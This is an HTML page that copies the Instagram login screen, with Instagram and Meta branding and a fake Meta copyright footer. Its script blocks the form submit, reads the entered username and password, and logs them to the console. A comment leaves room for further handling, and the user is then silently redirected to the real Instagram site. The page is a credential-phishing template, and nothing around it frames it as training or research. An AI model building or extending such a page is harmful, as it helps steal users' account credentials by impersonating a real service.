<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            width: 350px;
            background: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
            text-align: center;
            position: relative; /* لربط العناصر بشكل صحيح */
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 3px;
            background-color: #fafafa;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            color: #fff;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }

        button.fb-login {
            background-color: #4267b2;
            margin-top: 10px;
        }

        button:hover {
            background-color: #007bb5;
        }

        .divider {
            margin: 10px 0;
            border-top: 1px solid #ddd;
        }

        .forgot-password {
            color: #0095f6;
            text-decoration: none;
            font-size: 12px;
        }

        .sign-up {
            margin-top: 20px;
        }

        .sign-up a {
            color: #0095f6;
            text-decoration: none;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            text-align: center;
        }

        .meta-logo {
            width: 150px;
            margin-top: 10px;
        }

        .language-selector {
            text-align: right;
            margin-bottom: 10px;
        }

        .language-selector select {
            background-color: #fafafa;
            border: 1px solid #ddd;
            border-radius: 3px;
            padding: 5px;
        }

        /* إزالة أي عناصر غير مرغوب فيها قد تكون السبب */
        .extra {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- إضافة عنصر للاختبار -->
        <!-- <div class="extra"></div> -->
        <div class="language-selector">
            <select>
                <option value="en">English</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
                <option value="pt">Português</option>
                <option value="ar">العربية</option>
                <option value="zh">中文</option>
                <option value="ja">日本語</option>
                <option value="ko">한국어</option>
            </select>
        </div>
        <img src="https://i0.wp.com/m3rfa93.com/wp-content/uploads/2021/03/ins-01.jpg?w=400&ssl=1" alt="Instagram" class="logo">
        <form id="login-form">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <button type="button" class="fb-login">Log in with Facebook</button>
        </form>
        <div class="divider"></div>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="sign-up">
            <p>Don't have an account?</p>
            <a href="#">Sign up</a>
        </div>
    </div>
    <footer class="footer">
        <div class="meta-footer">
            <p>© 2024 Meta</p>
            <img src="https://d2u3dcdbebyaiu.cloudfront.net/uploads/atch_img/449/295050b2a07fb72de24dd32a716b5994.jpeg" alt="Meta" class="meta-logo">
        </div>
    </footer>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Log the user info in the console (only visible to developers)
            console.log("Username: " + username);
            console.log("Password: " + password);

            // Optionally: You can perform any action you want here before redirecting

            // Redirect to Instagram
            window.location.href = 'https://www.instagram.com/';
        });
    </script>
</body>
</html>
